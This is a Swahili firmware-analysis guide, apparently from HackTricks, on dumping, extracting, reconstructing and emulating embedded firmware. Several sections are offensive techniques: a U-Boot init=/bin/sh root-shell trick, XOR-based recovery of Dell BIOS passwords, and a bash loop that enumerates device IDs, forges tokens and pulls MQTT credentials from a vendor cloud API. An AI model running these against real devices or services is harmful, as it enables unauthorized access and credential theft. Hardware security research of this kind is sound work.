# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

Kwa kupata firmware kupitia miingiliano ya maunzi iliyo wazi, angalia [kutupa firmware kwa kutumia koni ya UART](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) na [kutupa flash ya SPI](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Ili kunasa UART wakati wa kuwasha kifaa kwa njia inayoweza kurudiwa kabla ya kupata ufikiaji wa koni, angalia [upataji wa data kwa kutumia umeme unaodhibitiwa na SCPI na oscilloscope](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni programu muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kusimamia na kurahisisha mawasiliano kati ya vipengele vya maunzi na programu ambazo watumiaji hutumia. Huhifadhiwa kwenye kumbukumbu ya kudumu, na hivyo kuhakikisha kifaa kinaweza kufikia maagizo muhimu mara tu kinapowashwa, kisha mfumo wa uendeshaji huanza. Kuchunguza na ikiwezekana kurekebisha firmware ni hatua muhimu ya kutambua udhaifu wa usalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali ya kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaotumia
- Maelezo mahususi ya bootloader
- Mpangilio wa maunzi na datasheet
- Vipimo vya codebase na maeneo ya source
- Maktaba za nje na aina za leseni
- Historia ya masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, sawa na uchanganuzi wa vipengele vyovyote vya programu huria vinavyopatikana, kwa kutumia michakato ya ukaguzi wa mikono na kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [LGTM ya Semmle](https://lgtm.com/#explore) hutoa uchanganuzi tuli bila malipo ambao unaweza kutumiwa kutafuta matatizo yanayoweza kuwepo.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- **Moja kwa moja** kutoka kwa chanzo (watengenezaji, wazalishaji)
- **Kuitengeneza** kwa kufuata maelekezo yaliyotolewa
- **Kuipakua** kutoka tovuti rasmi za usaidizi
- Kutumia utafutaji wa **Google dork** kupata faili za firmware zilizowekwa mtandaoni
- Kufikia **cloud storage** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kuzuia **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuitoa** kwenye kifaa kupitia miunganisho kama **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash), au **PICit**
- **Kunusa** maombi ya masasisho kwenye mawasiliano ya kifaa
- Kutambua na kutumia **miisho ya masasisho iliyowekwa moja kwa moja kwenye msimbo**
- **Kuitupa** kutoka kwa bootloader au mtandao
- **Kuondoa na kusoma** chipu ya hifadhi, ikiwa njia nyingine zote zimeshindwa, kwa kutumia zana zinazofaa za maunzi

### Logi za UART pekee: lazimisha root shell kupitia mazingira ya U-Boot kwenye flash

Ikiwa UART RX itapuuzwa (logi pekee), bado unaweza kulazimisha init shell kwa **kuhariri blob ya mazingira ya U-Boot** nje ya mtandao:<sup>[[6]](#references)</sup>

1. Tupa SPI flash kwa kutumia klipu ya SOIC-8 na programu ya kuandika (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta partition ya U-Boot env, hariri `bootargs` ili ijumuishwe `init=/bin/sh`, na **ukokotoe upya U-Boot env CRC32** ya blob.
3. Andika upya partition ya env pekee kisha uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii inafaa kwa vifaa vilivyopachikwa ambapo shell ya bootloader imezimwa lakini partition ya env inaweza kuandikwa kupitia ufikiaji wa flash wa nje.

### Kufichua msimbo uliolindwa kupitia task ya kunakili ya Firewall

Baadhi ya MCU huruhusu msimbo wa programu usiolindwa kuita gateway ya eneo lililolindwa badala ya kusoma Flash iliyolindwa moja kwa moja. Baada ya kupata uwezo wa kutekeleza msimbo wa programu, kagua kila gateway task kama primitive tofauti ya kuhamisha kumbukumbu. Katika hali ya Cypherock X1, lango la STM32L4 Firewall lilikubali task, pointer ya nje ya `data`, urefu, na `address` iliyolindwa. Task ya kuandika haikukataa pointer ya chanzo ya `data` inayoelekeza ndani ya Firewall Code. Mwitaji hakuweza kusoma msimbo huo moja kwa moja, lakini gateway yenyewe ingeweza kuunakili kwenye hifadhi isiyofutika iliyolindwa, kisha task ya kusoma iliyoruhusiwa kuufichua.<sup>[[15]](#references)</sup>

Ili kurudia aina hii ya ufichuzi, tambua ukurasa wa hifadhi iliyolindwa unaoweza kuandikwa na ulio na task inayolingana ya kusoma, weka chanzo cha kuandika kwenye anwani zinazofuatana za msimbo uliolindwa, kisha usome tena baiti zilizohifadhiwa kwa muda. Kagua hifadhi kabla ya kurudia uandishi: katika hali hii ilikuwa Flash, kwa hiyo ukurasa ulihitaji kufutwa kabla ya kutumiwa tena. Watafiti walitumia utaratibu uliofuta na kurejesha maudhui halali ya Secure Data Storage, kisha kuhifadhi msimbo katika nafasi iliyobaki badala ya kufuta data ya wallet. Hili linahitaji uwezo wa kutekeleza msimbo kwenye MCU na lango la kuita linalofikika; si njia ya moja kwa moja ya kukwepa vizuizi vya usomaji kutoka kwa host isiyo na uthibitishaji.<sup>[[15]](#references)</sup>

Msimbo uliorejeshwa unaweza kufichua [mapengo ya uaminifu katika sasisho za firmware na uadilifu wa boot](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Kuchambua firmware

Sasa kwa kuwa **una firmware**, unahitaji kutoa taarifa kuihusu ili kujua jinsi ya kuichunguza. Zana mbalimbali unazoweza kutumia kwa hilo:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ikiwa hupati mengi kwa kutumia zana hizo, angalia **entropy** ya picha kwa `binwalk -E <bin>`. Ikiwa entropy ni ndogo, huenda haijasimbwa kwa njia fiche. Ikiwa entropy ni kubwa, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au tumia [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Vipengee ghafi vya onyesho kwenye flash ya nje

SPI dump ya nje si lazima iwe firmware inayotekelezeka ya MCU. Kwa kifaa lengwa cha Cortex-M, linganisha mwanzo wa kila eneo linaloweza kuwa code na ramani ya kumbukumbu ya kifaa: vector table ya kawaida huanza na anwani inayowezekana ya SRAM stack pointer na anwani ya reset handler iliyo kwenye kumbukumbu inayotekelezeka. Kukosekana kwa vector table kwenye offset sifuri pekee hakuthibitishi kuwa chipu nzima haina code; kagua offset nyingine na mpangilio wa boot. Ikiwa `binwalk` haitambui container, kagua byte ghafi na ulinganishe anwani za usomaji wa flash na vitendo vinavyopakia skrini mpya, ukitumia [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer).<sup>[[14]](#references)</sup>

Kwa eneo la vipengee vya onyesho, jaribu miundo na vipimo tofauti vya pixel badala ya kudhani ni PNG/JPEG. Kifaa kilichorejelewa kilitumia fremu za **80×160 RGB565 little-endian**: kwa byte mbili kwa pixel, fremu moja ni **25,600 bytes** (25 KiB), si kilobiti 24. Anwani ya usomaji wa flash iliyosimbuliwa ilitambua offset ya kipengee cha skrini; mtafiti alibadilisha picha iliyotayarishwa kwa `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, akaweka kipengee chenye ukubwa sawa kwenye dump asili, akaiandika kwa `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`, na kuthibitisha picha mpya kwenye onyesho. Hii inaonyesha kuwa *vipengee vya onyesho vya nje* vinaweza kuandikwa, si kwamba firmware ya ndani ya MCU imetolewa au kuandikwa upya. Hifadhi dump asili na uthibitishe vipimo, mpangilio wa byte, offset na urefu wa kipengee mbadala kabla ya kuandika chochote.<sup>[[14]](#references)</sup>

### Uchanganuzi tofauti wa flash na hifadhi za siri za XOR zinazoweza kurejeshwa

Wakati mpangilio wa firmware hauna muundo wa hifadhi ulioandikwa, kwanza fanya usomaji kadhaa unaolingana wa flash, badilisha **mpangilio mmoja tu**, kisha dump chipu nzima tena na ulinganishe offset. Kurudia jaribio kwa thamani zinazodhibitiwa hutofautisha mpangilio huo na kaunta pamoja na metadata ya uandishi; mabadiliko kwenye offset mpya badala ya sehemu ileile huashiria hifadhi ya append-only au iliyopangwa kama log. Hifadhi maingizo yaliyofutwa/yaliyowekwa alama ya kufutwa, kwa kuwa byte za data zake huenda bado zikaweza kurejeshwa.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Baada ya kupata eneo hilo, toa moduli za firmware kwa kutumia zana kama `binwalk`, kisha fanya reverse engineering ya writer/validator katika Ghidra. Thibitisha mipaka ya field, padding, indexing ya key na derivation ya key kwenye code badala ya kukisia scheme kutokana na mifumo ya ciphertext pekee.<sup>[[12]](#references)</sup>

#### Rejesha keys kutoka kwenye zero padding iliyosimbwa

Kama ilivyoelezwa kwenye [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), plaintext inayojulikana hufichua bytes za keystream katika offsets zilezile. Field yenye ukubwa usiobadilika huwa katika hatari zaidi hasa padding yake ya sifuri inapojumuisha kila index ya key ya XOR inayojirudia: padding iliyosimbwa hufichua bytes hizo za key moja kwa moja kwa sababu `0x00 XOR key_byte = key_byte`. Ikiwa kila index ya key imefunikwa, jenga upya key kutokana na mwisho wa ciphertext na usimbue bytes zenye data.<sup>[[12]](#references)</sup>

Muundo wa DVAR wa nenosiri la BIOS ulio katika mazingira hatarishi wa Dell ni mfano halisi: byte `0` ya field ya 32-byte iko kwenye plaintext, ilhali bytes `1..31` hutumia key inayojirudia ya 20-byte.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Kwa urefu wa nenosiri `L`, nafasi `L..31` zilikuwa sifuri kabla ya XOR. Wakati `L <= 12`, nafasi hizo zinajumuisha kila faharasa ya key, hivyo key na nenosiri kamili hupatikana bila brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Pata funguo kutoka kwenye rekodi za kihistoria

Usichanganue kila rekodi kivyake. Ufunguo wa DVAR hukokotolewa takribani kama `modified_md5(device_seed || variable_GUID || password[0])`: device seed na GUID hazibadiliki, na ingizo pekee linalotegemea nenosiri ni byte ya kwanza iliyo wazi. Hii hutoa hadi funguo 256 kwa kila kifaa na husababisha rekodi zinazoanza na byte ileile kushiriki ufunguo. Panga rekodi zilizo hai na zilizofutwa kulingana na byte hiyo; rekodi fupi ya kihistoria inaweza kufichua ufunguo mzima kupitia padding na kusimbua rekodi ndefu ya sasa ambayo padding yake haitoshi. Kwa hiyo, kubadilisha nenosiri kunaweza kuongeza hatari ya kufichuliwa pale ciphertext ya zamani inapowekwa alama ya kufutwa badala ya kufutwa kabisa.<sup>[[12]](#references)</sup>

Zana ya [`dellpwn`](https://github.com/R3n5k1/dellpwn) hutafuta DVAR, huthibitisha rekodi zinazoweza kutumika, hurejesha manenosiri, na inaweza kuonyesha byte ghafi zilizohifadhiwa/za ufunguo. Iunde kutoka kwenye checkout na uchanganue picha ya flash iliyothibitishwa kama ifuatavyo:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Kwa custom parsers, kataa matokeo chanya ya uongo kwa kutumia muundo wa rekodi, masharti ya herufi zinazoweza kuchapishwa, ukaguzi wa zero-padding, entropy ya key, na uthabiti pale key inapozunguka. Ikiwa dumps zinazorudiwa zinaonyesha mabadiliko machache ya bit kwa kila write, orodhesha masks zilizobainika na upange marekebisho kwa kutumia masharti haya, lakini ripoti herufi zisizo na uhakika badala ya kuwasilisha matokeo ya heuristic kana kwamba ni recovery sahihi kabisa.<sup>[[12]](#references)</sup>

Password verifiers zinapaswa kuhifadhi hash ya one-way yenye salt na inayorudiwa mara nyingi badala ya ciphertext inayoweza kurejeshwa, na hifadhi za log-structured zinapaswa kuondoa kwa usalama nyenzo za siri zilizopitwa na wakati.<sup>[[12]](#references)</sup>

### Kupata Filesystem

Ukiwa na tools zilizotajwa awali, kama `binwalk -ev <bin>`, unapaswa kuwa umeweza **kutoa filesystem**.\
Kwa kawaida, Binwalk huitoa ndani ya **folder yenye jina la aina ya filesystem**, ambazo kwa kawaida ni mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Utoaji wa Filesystem kwa Mkono

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem kwenye signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya filesystem na kuchonga filesystem iliyobanwa** kutoka kwenye binary, kisha **utoe filesystem kwa mkono** kulingana na aina yake ukitumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Endesha **dd command** ifuatayo ili kutoa mfumo wa faili wa Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa kwenye saraka ya "`squashfs-root`" baadaye.

- Faili za kumbukumbu za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Kuunda upya mifumo ya faili ya root iliyogawanywa kwenye vifaa vilivyopachikwa

Ikiwa dump ghafi ya eMMC/SSD ina kichwa halali cha mfumo wa faili lakini offsets za metadata zake zinaishia nje ya ukubwa wa kawaida wa partition, usiihitimishe mara moja kuwa imeharibika. Msimbo wa boot wa vifaa vilivyopachikwa unaweza kuunda kifaa halisi cha root kutoka kwenye safu nyingi za kimwili kwa kutumia Device Mapper, kwa hiyo kutoa data kutoka kwenye partition moja ya GPT hutoa sehemu ya kwanza pekee.<sup>[[9]](#references)</sup>

#### Kuchunguza picha kamili ya media

Kwanza thibitisha kuwa upataji umekamilika, ukubwa wa picha ni thabiti, na hakuna mchakato wa uandishi unaoishikilia. Ikiwa jina la faili lina anwani ya mwanzo/mwisho, linganisha masafa hayo na idadi halisi ya baiti. Rejesha GPT katika hali ya kusoma pekee na uambatishe masafa yanayohitajika pekee; **usiendeshe** `vgchange -ay` dhidi ya volume halisi isiyoaminika kwenye workstation kwa sababu migongano ya vikundi vya volume na uandishi usiokusudiwa vinaweza kutokea.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Pendelea VM ya muda unapohitaji logic ya awali ya init au stack ya LVM kuona image nzima. Kumbukumbu za zamani za boot kutoka partition ya kawaida ya boot zina manufaa hasa: huenda bootloader ilirekodi offsets za proprietary container, urefu wa components, uteuzi wa slot, kanuni za alignment, na uthibitishaji wa signature. Tumia thamani hizo kutenganisha command line/kernel/initramfs iliyopachikwa, kisha thibitisha kila towe kivyake kwa `file`, magic bytes na `binwalk`; kusoma hadi mwisho wa container kunaweza kuambatanisha initrd, object ya ACPI, au signature kwenye kernel kimakosa.<sup>[[9]](#references)</sup>

#### Rejesha ramani ya block ya wakati wa boot

Toa initramfs ya kernel na fanya reverse engineering ya `/init` yake pamoja na maktaba zozote za storage. Katika [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), fuatilia marejeo ya strings za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64`, na njia za partition; kisha fuatilia code inayochagua slot hai ya A/B na kuunda table. Sehemu nzuri za kuanzia katika radare2 ni `r2 -A init`, `afl`, `pdf @ main`, na `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Linear target huweka safu zinazofuatana za kifaa pepe kwenye safu za kifaa kimoja au zaidi vinavyohifadhi data. Table ya sehemu mbili iliyorejeshwa kwa kawaida huwa na muundo huu (nafasi na urefu wote ni sekta za baiti 512):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Rudia hesabu za machine-code kwa usahihi, ikijumuisha upana wa integer, shifts, na ubadilishaji wa vipimo. Kwa mfano, usemi ufuatao huzungusha ukubwa wa byte kwenda chini hadi mpaka wa 4-KiB, kisha tu huubadilisha kuwa sectors za 512-byte; kuubadilisha na `p4_bytes // 512` huhamisha sehemu ya mwisho iliyochaguliwa kwa `p4_bytes % 4096` kila mara partition inapokuwa haijalinganishwa na page.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Jenga upya image tambarare ya uchanganuzi kwa kunakili ranges kwa mpangilio wa jedwali, ukitumia chunks zenye ukubwa uliowekewa kikomo badala ya kupakia media dump nzima kwenye memory. Hii pia huepusha kuunda mapper devices upande wa host. Weka offsets zilizotokana na GPT, idadi za sectors zilizogeuzwa, na urefu wa output kama assertions tofauti.<sup>[[9]](#references)</sup>

#### Tofautisha uharibifu na kosa la mara kwa mara la ujenzi upya

Kwa SquashFS, kagua magic ya `hsqs` na decode field ya `bytes_used` ya little-endian yenye biti 64 kwenye offset 40 ya superblock kabla ya kuendesha `unsquashfs`. Ikiwa extraction itashindwa katika miundo kadhaa isiyohusiana, tafuta kwenye window pana inayozunguka nafasi zinazotarajiwa na uhakikishe kuna candidates imara za kimuundo: metadata block inayoweza decompressiwa, directory entries kadhaa halali zinazofuatana, inode fields zinazoonekana kuwa zinazowezekana, root inode inayolingana na idadi ya inode, au muundo halali wa integrity metadata. Kulingana na magic match moja pekee haitoshi.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wakati delta ileile yenye saini inafanya miundo huru kuwa halali—kwa mfano, metadata ya saraka na rekodi ya verity—sababu inayowezekana ni hitilafu ya kimfumo ya mwanzo wa segment, badala ya kukosekana kwa baiti. Rudi kwenye hesabu iliyogeuzwa na utafute mabaki yaliyotupiliwa mbali, signedness, overflow au rounding ya sector/page kabla ya kujaribu kurejesha orphan au kufanya patching ya metadata ya filesystem.<sup>[[9]](#references)</sup>

Hatimaye, weka mipaka ya ulinzi ikiwa tofauti: volumes za LUKS zilizofungwa kwa TPM hulinda usiri wa data, ilhali mapping ya dm-verity iliyotiwa saini hulinda uadilifu wa root filesystem. TPM ya software haiwezi kurejesha key iliyofungwa kwa TPM halisi ya awali, na kuwasha SquashFS iliyorekebishwa kupitia init ya utafiti pekee inayoacha uthibitishaji wa verity hakufanyi saini yake kuwa bandia wala hakuvunji dm-verity.<sup>[[9]](#references)</sup>

## Kuchambua Firmware

Mara firmware inapopatikana, ni muhimu kuichanganua ili kuelewa muundo wake na udhaifu unaoweza kuwapo. Mchakato huu unahusisha kutumia zana mbalimbali kuchambua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Uchambuzi wa Awali

Kwa zana na usomaji zaidi kuhusu uchambuzi wa firmware, angalia [sehemu ya firmware katika Zana na Rasilimali za Watu Wengine](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware).

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchambua data ya binary na kuelewa maelezo ya partitions na filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche wa image, **entropy** hukaguliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini hudokeza ukosefu wa usimbaji fiche, ilhali entropy ya juu huashiria uwezekano wa usimbaji fiche au ukandamizaji.

Kwa kutoa **faili zilizopachikwa**, inapendekezwa kutumia zana na nyenzo kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa mfumo wa faili, mara nyingi kwenye folda iliyopewa jina la aina ya mfumo wa faili (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya mfumo wa faili kwa sababu magic bytes hazipo, utoaji wa faili kwa mkono unahitajika. Hii huhusisha kutumia `binwalk` kutafuta offset ya mfumo wa faili, kisha kutumia amri ya `dd` kutoa mfumo huo wa faili:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kulingana na aina ya filesystem (kwa mfano, squashfs, cpio, jffs2, ubifs), hutumika amri tofauti kutoa maudhui kwa mikono.

### Uchambuzi wa Filesystem

Baada ya kutoa filesystem, utafutaji wa dosari za usalama huanza. Huchunguzwa daemoni za mtandao zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, utendaji wa seva za masasisho, code ambayo haijacompile, startup scripts na compiled binaries kwa ajili ya uchambuzi wa offline.

**Maeneo muhimu** na **vipengee** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa credentials za watumiaji
- Vyeti vya SSL na keys katika **etc/ssl**
- Faili za usanidi na script kwa uwezekano wa udhaifu
- Embedded binaries kwa uchambuzi zaidi
- Web servers na binaries zinazotumika kwa kawaida katika vifaa vya IoT

Zana kadhaa husaidia kugundua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa utafutaji wa taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa uchambuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa uchambuzi wa static na dynamic

### Ukaguzi wa Usalama wa Compiled Binaries

Source code na compiled binaries zinazopatikana kwenye filesystem lazima zikaguliwe kwa udhaifu. Zana kama **checksec.sh** kwa Unix binaries na **PESecurity** kwa Windows binaries husaidia kutambua binaries zisizo na ulinzi ambazo zinaweza kutumiwa vibaya.

## Kukusanya usanidi wa cloud na credentials za MQTT kupitia tokeni za URL zinazotokana na device ID

Hubs nyingi za IoT hupata usanidi wa kila kifaa kutoka kwenye cloud endpoint inayofanana na hii:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa uchambuzi wa firmware, unaweza kugundua kuwa `<token>` hutokana na device ID ndani ya kifaa kwa kutumia secret iliyowekwa moja kwa moja kwenye code, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Muundo huu humwezesha mtu yeyote anayepata deviceId na STATIC_KEY kutengeneza upya URL na kupakua usanidi wa cloud, ambao mara nyingi hufichua credentials za MQTT zilizo katika maandishi wazi na viambishi awali vya topic.

Mtiririko wa kazi wa vitendo:

1) Toa deviceId kutoka kwenye UART boot logs

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na unasa logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya usanidi wa cloud na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Rejesha STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Tengeneza token kwa Bash na uweke digest kwa herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya usanidi wa cloud na taarifa za uthibitishaji za MQTT

- Unda URL na upakue JSON kwa kutumia curl; ichanganue kwa jq ili kutoa siri:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya MQTT ya maandishi wazi na ACL za topic dhaifu (ikiwa zipo)

- Tumia credentials zilizopatikana kufanya subscribe kwenye maintenance topics na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha device IDs zinazotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Mifumo mingi huweka byte za OUI/product/type za vendor, zikifuatiwa na kiambishi tamati cha mfuatano.
- Unaweza kujaribu IDs zinazowezekana kwa mfululizo, kupata tokens na kupakua configs kwa njia ya programu:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Maelezo
- Pata idhini ya wazi kila wakati kabla ya kujaribu kufanya enumeration ya kiwango kikubwa.
- Pendelea emulation au static analysis ili kurejesha siri bila kurekebisha hardware lengwa inapowezekana.


Mchakato wa ku-emulate firmware huwezesha **dynamic analysis** ya utendakazi wa kifaa au programu mahususi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na utegemezi wa hardware au usanifu, lakini kuhamisha root filesystem au binary mahususi kwenye kifaa chenye usanifu na endianness inayolingana, kama Raspberry Pi, au kwenye virtual machine iliyoundwa mapema kunaweza kurahisisha majaribio zaidi.

### Kuiga Binary za Programu Binafsi

Unapochunguza programu moja, ni muhimu kutambua endianness na usanifu wa CPU wa programu hiyo.

#### Mfano wa Usanifu wa MIPS

Ili ku-emulate binary ya usanifu wa MIPS, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na kusakinisha zana muhimu za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`, na kwa binary za little-endian, chaguo litakuwa `qemu-mipsel`.

#### Uigaji wa Usanifu wa ARM

Kwa binary za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kwa uigaji.

### Uigaji wa Mfumo Kamili

